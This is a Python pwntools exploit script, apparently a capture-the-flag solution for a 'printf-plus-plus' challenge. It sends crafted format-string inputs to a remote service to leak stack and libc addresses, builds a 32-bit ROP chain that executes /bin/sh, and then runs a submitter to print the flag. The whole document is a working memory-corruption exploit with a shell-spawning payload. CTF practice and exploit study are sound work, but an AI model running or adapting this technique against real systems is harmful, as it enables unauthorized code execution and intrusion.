from pwn import *

context.terminal = ['kitty']

HOST = os.environ.get('HOST', 'localhost')
PORT = int(os.environ.get('PORT', '31337'))

r = remote(HOST, PORT)

#BASE_DIR = Path(__name__).absolute().parent.parent.parent / "handouts" / "quals-printf-plus-plus-handout" / "handout"
BASE_DIR = Path("/handout")

PATH = BASE_DIR / "challenge"

BIN = ELF(PATH)
LIBC = ELF(BASE_DIR / "libc.so.6")
LD = ELF(BASE_DIR / "ld-linux.so.2")

r.sendlineafter(b'(eg "{:#x}")\n', b'{0:0256}')
r.recv(256)
stack_leak = u32(r.recv(4))
buf_addr = stack_leak + 0x100

print(f'{stack_leak=:#x}')
print(f'{buf_addr=:#x}')

r.sendlineafter(b'(eg "{:#x}")\n', b'{0:0372}')
r.recv(372)
libc_leak = u32(r.recv(4))
libc_leak_offset = 0x21519
libc_base = libc_leak - libc_leak_offset

print(f'{libc_leak=:#x}')
print(f'{libc_base=:#x}')

esp = p32(buf_addr + 256 + 84 + 4 + 4 + 4 + 4 + 4) # point to chain, extra +4 bc it needs it
ebx = p32(libc_base + next(LIBC.search(b'/bin/sh\x00')))
ecx = p32(0x41414141)
ebp = p32(0x42424242)

chain = b''.join(p32(libc_base + i) for i in [
    0x00034ec0, #: xor eax, eax ; ret
    0x00195996, #: add eax, 0xb ; ret
    0x00037374, #: pop ecx ; pop edx ; ret
    buf_addr - 4 - libc_base, # ptr to null
    buf_addr - 4 - libc_base, # ptr to null
    0x00037765, #: int 0x80
])

fin = b'{0:0256}' + b'A'*84 + esp + ebx + ecx + ebp + chain
assert not any(i in fin[8:] for i in [b'\x00', b'{', b'}']), "got unlucky try again"
r.sendlineafter(b': ', fin)
r.sendlineafter(b': ', b'')


r.sendline(b"./submitter")
r.recvuntil(b"Flag: ")
print(r.recvuntil(b"\n").decode(), end='')


r.interactive()
